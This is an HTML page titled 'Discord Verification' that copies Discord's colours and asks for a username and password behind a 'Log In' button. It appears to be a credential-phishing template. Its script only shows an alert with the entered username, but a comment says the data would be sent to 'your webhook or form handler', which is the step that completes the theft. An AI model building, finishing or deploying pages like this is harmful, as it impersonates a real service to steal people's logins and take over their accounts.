<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #2f3136; /* Discord Dark Gray */
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #36393f;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 300px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }
        h2 { margin-top: 0; }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #4f4f4f;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #7289da; /* Discord Blurple */
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        button:hover { background-color: #5b6eae; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Verify Account</h2>
        <input type="text" id="username" placeholder="Username">
        <input type="password" id="password" placeholder="Password">
        <button id="myButton">Log In</button>
    </div>

    <!-- Script moved to the bottom so the HTML loads first -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const button = document.getElementById('myButton');
            const username = document.getElementById('username');
            const password = document.getElementById('password');

            if (button) {
                button.addEventListener('click', () => {
                    console.log('Clicked!');
                    alert('Logging in as: ' + username.value);
                    // Here you would send data to your webhook or form handler
                });
            }
        });
    </script>

</body>
</html>
